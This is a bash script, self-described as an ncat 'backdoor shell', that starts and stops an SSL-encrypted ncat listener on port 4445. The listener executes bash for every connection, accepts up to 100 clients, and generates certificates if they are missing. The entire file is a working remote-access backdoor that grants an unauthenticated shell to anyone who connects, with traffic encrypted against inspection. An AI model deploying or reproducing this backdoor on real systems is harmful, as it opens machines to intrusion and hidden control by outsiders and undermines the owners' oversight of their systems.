#!/bin/bash
#--------------------------------------------------------------------------
# Program     : ncat_shell
# Version     : v1.0
# Description : Run ncat as a backdoor shell with SSL certificate.
# Syntax      : ncat_shell.sh
# Requires    : build_sslcert.sh
# Author      : Andrew (andrew@devnull.uk)
#--------------------------------------------------------------------------

#set -x

ssl_dir=$PWD/../ssl
pid_file=${0%.*}.pid

ncat_sh=$(which bash)
ncat_bin=$(which ncat)
ncat_prt=4445

function help()
{
    cat << EOF
Start/stop ncat backdoor shell with SSL.

Usage: $0 [-s|-k|-h]
Options:
  -s|--start	Startup ncat service.
  -k|--stop	Stop ncat service.
  -h|--help	Display this help

EOF
}

# Check ncat exists.

ncat_ssl_prereq()
{
    if [ ! -f "$ncat_bin" ]; then
        echo "Error: Failed to find ncat binary."
        exit
    fi

    if [ ! -f "certs/server/server.crt" ] ||
    [ ! -f "$PWD/certs/server/server.key" ]; then
        echo "Building new SSL certs for service..."

        if [ -f $ssl_dir/build_sslcert.sh ]; then
            . build_sslcert.sh
        else
            echo "Error: Unable to build SSL certs."
            exit
        fi
    fi

    cert_file="certs/server/server.crt"
    cert_key="certs/server/server.key"
    echo "SSL cert file : $cert_file"
    echo "SSL key file  : $cert_key"
}

# Run ncat with new SSL certificate if not already running/stale.

ncat_ssl_start()
{
    ncat_ssl_prereq

    if [ -f "$pid_file" ]; then
        echo "Found existing .pid (pid: $pid_file)"
        pgrep -F $pid_file
        pid_stale=$?
        pid_old=$( cat $pid_file )
        echo "Existing ncat process check status: $pid_stale"

        if [ $pid_stale -eq 1 ]; then
            echo "ncat process (pid:$pid_old) stale. Removing file."
            rm $pid_file
        else
            echo "Update ncat process and restarting (pid:$pid_old)"
            kill -9 $(cat $pid_file)
            $ncat_bin --listen --ssl --ssl-cert $cert_file --ssl-key $cert_key -p $ncat_prt -k -m 100 -e $ncat_sh &
            echo $! > $pid_file
            exit
        fi
    else
        echo "Creating new ncat process (pid:$pid_file)"
        $ncat_bin --listen --ssl --ssl-cert $cert_file --ssl-key $cert_key -p $ncat_prt -k -m 100 -e $ncat_sh &
        echo $! > $pid_file
    fi
}

# Stop ncat process if running.

ncat_ssl_stop()
{
    if [ -f "$pid_file" ]; then
        echo "Found existing .pid (pid: $pid_file)"
        pgrep -F $pid_file
        pid_stale=$?
        pid_old=$( cat $pid_file )
        echo "Existing ncat process check status: $pid_stale"

        if [ $pid_stale -eq 1 ]; then
            echo "ncat process (pid:$pid_old) stale. Removing file."
            rm $pid_file
        else
            echo "Stopping running ncat process (pid:$pid_old)"
            kill -9 $(cat $pid_file)
            rm $pid_file
            exit
        fi
    else
        echo "Error: no ncat process running."
    fi
}

main()
{
    if (( $# < 1 )); then
        help
    else
        while [ $# -ne 0 ]; do
            case $1 in
                -s | --start )	shift;
                    ncat_ssl_start
                    exit
                    ;;
                -k | --stop )	shift;
                    ncat_ssl_stop
                    exit
                    ;;
                -h | --help )	help
                    exit
                    ;;
                * )		help
                    exit 1
            esac
            shift
        done
    fi
}

main "$@"
